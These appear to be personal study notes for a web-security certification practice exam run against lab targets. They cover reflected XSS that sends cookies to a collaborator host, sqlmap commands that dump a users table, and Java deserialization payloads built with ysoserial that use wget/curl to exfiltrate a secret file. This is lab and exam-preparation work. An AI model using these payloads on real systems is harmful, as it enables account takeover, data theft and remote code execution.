2/22/2026

Lab ID
```
0a3900d5040d89d0808344da009c00e5.web-security-academy.net
```

Email address
```
attacker@exploit-0a8400ef04a48976802543f3010a0004.exploit-server.net
```

exploit server
```
https://exploit-0a8400ef04a48976802543f3010a0004.exploit-server.net/exploit
```

burp collaborator
```
6bixp3vpfmutur4k953a62z76yc00rufj.oastify.com
```

- No robots.txt
- No hidden directories in page source
- /admin
	- Admin interface only available if logged in as an administrator
- /refreshpassword
	- forgot password 

Can't use iframe payloads because of: "frame because it set 'X-Frame-Options' to 'sameorigin'"



If the blocked character was `.` not `()`  
Note: replace the bold text with its value.  
**Payload**:  
`“};location=atob(“**base64('https://BURP-COLLAB-URL/?')**”)+document[“cookie”]; //   `**URL-encoded Payload**:  
`%22%7d%3b%20location%3datob(%22**_base64('https://BURP-COLLAB-URL/?')_**%22)%2bdocument%5b%22cookie%22%5d%3b%20%2f%2f`


Got alert(1) because of DOM invader saying eval(1)
```
\\"-alert(1)}//
```

"Potentially dangerous search term"
- doesnt like `.` in search bar so had to url encode it to `%2e`
These worked
```
\\"-(window["location"]="http://nypecki623hah8r1wmqrtjmotfzhn8gw5%2eoastify%2ecom/?c="+window["document"]["cookie"])}//
```

```
<script>
location="https://0a9800b9036075b780453f6100bb00d4.web-security-academy.net/?SearchTerm=%5C%5C%22-%28window%5B%22location%22%5D%3D%22http%3A%2F%2Fnypecki623hah8r1wmqrtjmotfzhn8gw5%252eoastify%252ecom%2F%3Fc%3D%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29%7D%2F%2F"
</script>  

```

Got a session cookie back after delivering exploit to victim
```
session=Vc7knhz7SA5oM4RjHOJpfOSzkkDD7MI2
```

Got into carlos's account
password: 93c2516debbc64a4
![Practice Exam 1-20260222221305403](Practice%20Exam%201-20260222221305403.png)

Stage 2
Target scan `https://0a9800b9036075b780453f6100bb00d4.web-security-academy.net/advanced_search?SearchTerm=aaa&organize_by=DATE&blogArtist=Rich+Man`
![Practice Exam 1-20260222221646999](Practice%20Exam%201-20260222221646999.png)

This worked -- listed the database and database name=public
Can use `*`  as an injection point but sqlmap didn't find it
```
sqlmap -u 'https://0a3900d5040d89d0808344da009c00e5.web-security-academy.net/advanced_search?SearchTerm=aaa&organize_by=DATE&blogArtist=Rich+Man' --random-agent --time-sec 10 --cookie='_lab=_lab=46%7cMCwCFHaatQwoxjueO5CX2Qmwj1At0tOIAhR3%2bpKehG91BYhDzerAehSSdOseB8oyeU8s75IHyNlzvjLRQ%2bO%2bWm3eNOT12ncuZqenLrQyNSfKyDjVmOfc52lUBGzpO36cf25Fp7bwKzfTFtxt1TANN8OQWWW6sjDdk9Tyey42HRZxrnk%3d; session=Vc7knhz7SA5oM4RjHOJpfOSzkkDD7MI2' --level=5 --risk=3 -p 'organize_by' --batch --dbs
```


![Practice Exam 1-20260222223339559](Practice%20Exam%201-20260222223339559.png)
Booloean based blind
![Practice Exam 1-20260222223410359](Practice%20Exam%201-20260222223410359.png)

list the tables
```
sqlmap -u 'https://0a9800b9036075b780453f6100bb00d4.web-security-academy.net/advanced_search?SearchTerm=aaa&organize_by=*&blogArtist=Rich+Man' --random-agent --time-sec 10 --cookie='_lab=46%7cMCwCFE0DLD%2bY54NUnEqSD9bJl6EKdt4xAhQk4%2fgHfCx5qpvpOYbIw5tjKr6IFeLgdKL7gygJLboJvxWkE9xx9VK0qZVFbdNkkGRf29vc9%2fMfx7bBcqeqGRp434XoptHMEtH%2bytv808%2fSpv%2bGR%2fa9E5jY5xckIfg47FdI%2fsgyR9px2%2fQ%3d; session=RIfbZbDcnaXxWCHiiHViFnnCjgL8uVbQ' --dbms PostgreSQL --level=5 --risk=3 -p 'organize_by' --batch --technique=B -D public --tables
```

![Practice Exam 1-20260222223705737](Practice%20Exam%201-20260222223705737.png)

dump the contents of the users table
```
sqlmap -u 'https://0a9800b9036075b780453f6100bb00d4.web-security-academy.net/advanced_search?SearchTerm=aaa&organize_by=*&blogArtist=Rich+Man' --random-agent --time-sec 10 --cookie='_lab=46%7cMCwCFE0DLD%2bY54NUnEqSD9bJl6EKdt4xAhQk4%2fgHfCx5qpvpOYbIw5tjKr6IFeLgdKL7gygJLboJvxWkE9xx9VK0qZVFbdNkkGRf29vc9%2fMfx7bBcqeqGRp434XoptHMEtH%2bytv808%2fSpv%2bGR%2fa9E5jY5xckIfg47FdI%2fsgyR9px2%2fQ%3d; session=RIfbZbDcnaXxWCHiiHViFnnCjgL8uVbQ' --dbms PostgreSQL --level=5 --risk=3 -p 'organize_by' --batch --technique=B -D public -T users --dump
```

Used this. It's faster.
```
sqlmap -r sqli_request --level=5 --risk=3 -p 'organize_by' --batch -D public -T users --dump
```
![Practice Exam 1-20260223143625066](Practice%20Exam%201-20260223143625066.png)

Login in with `administrator:b235d711d5858825`
![Practice Exam 1-20260223143702017](Practice%20Exam%201-20260223143702017.png)

Click on the admin panel and see a new `admin-prefs` cookie. Highlighting it doesn't fully decode it. 
![Practice Exam 1-20260223143836740](Practice%20Exam%201-20260223143836740.png)

---
Automated
use cyberchef magic wand. Click the magic wand again and it will show you it is gzip.
![Practice Exam 1-20260223150917126](Practice%20Exam%201-20260223150917126.png)
![Practice Exam 1-20260223150953849](Practice%20Exam%201-20260223150953849.png)

Manual
Send to decoder > See %3d, %2f, etc. so it is url encoded. then you see it ends with == so it's base64. google `1f 8b header` and it shows this is gzip. https://en.wikipedia.org/wiki/List_of_file_signatures

This is a JSON CommonCollection thing.
![Practice Exam 1-20260223144535677](Practice%20Exam%201-20260223144535677.png)
---
Automated
Use Java Deserialized Scanner. If Sleep doesn't work, try DNS (vuln libraries).
Then Compress using gzip > encode using base64 > encode using URL encoding.
We can use Apache CommonCollection3 to generate a payload.
![Practice Exam 1-20260223145853605](Practice%20Exam%201-20260223145853605.png)

Right click > send to exploitation tab.
Did not work
```
CommonsCollections3 'wget https://6bixp3vpfmutur4k953a62z76yc00rufj.oastify.com --post-file=/home/carlos/secret'
```

```
CommonsCollections3 'curl --data@/home/carlos/secret https://6bixp3vpfmutur4k953a62z76yc00rufj.oastify.com'
```


If you use a CommonsCollections that doesn't work, it will show "ERROR IN YSOSERIAL COMMAND. SEE STDERR FOR DETAILS" 
Used CommonsCollections6.
![Practice Exam 1-20260223154617594](Practice%20Exam%201-20260223154617594.png)

When you use the one that works, you get a response and Burp collab back.
![Practice Exam 1-20260223154707559](Practice%20Exam%201-20260223154707559.png)
![Pasted image 20260223154717](Pasted%20image%2020260223154717.png)

Use dig to try it out first. If you get a DNS query back with the commonscollection you picked, then that is the one to use.
```
CommonsCollections7 'dig s5yjjppb98ofody63rxw0ott0k6nudi2.oastify.com'
```


```



# did not work in deserialized scanner but it did work in the manual solution
CommonsCollections7 'wget https://s5yjjppb98ofody63rxw0ott0k6nudi2.oastify.com --post-file=/home/carlos/secret'

CommonsCollections7 'curl https://s5yjjppb98ofody63rxw0ott0k6nudi2.oastify.com -d @/home/carlos/secret'

```




**DID TO ADD JAVA 8 TO FIX THIS**

If get IncompleteAnnotationException... missing element entrySet error, go through all the collections 1-6.
![Practice Exam 1-20260223151152786](Practice%20Exam%201-20260223151152786.png)

ERROR IN YSOSERIAL: fix.
![Practice Exam 1-20260223154515447](Practice%20Exam%201-20260223154515447.png)
```
/Library/Java/JavaVirtualMachines/temurin-8.jdk/Contents/Home/bin/java

/Users/shixian/Documents/Hax/bscp/ysoserial-all.jar
```


Manual
```
java \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
-Djdk.xml.enableTemplatesImplDeserialization=true \
-jar /Users/shixian/Documents/Hax/bscp/ysoserial-all.jar \
CommonsCollections7 'wget https://s5yjjppb98ofody63rxw0ott0k6nudi2.oastify.com --post-file=/home/carlos/secret' | base64 -w 0
```

Paste the output of this command to decoder.
1. decode as base64
2. encode gzip
3. encode base64
4. encode url
![Practice Exam 1-20260223153214952](Practice%20Exam%201-20260223153214952.png)

Paste it in admin-prefs > got a 500 error but check Collaborator.
![Practice Exam 1-20260223153238849](Practice%20Exam%201-20260223153238849.png)

Submit and solve.
![Practice Exam 1-20260223153306026](Practice%20Exam%201-20260223153306026.png)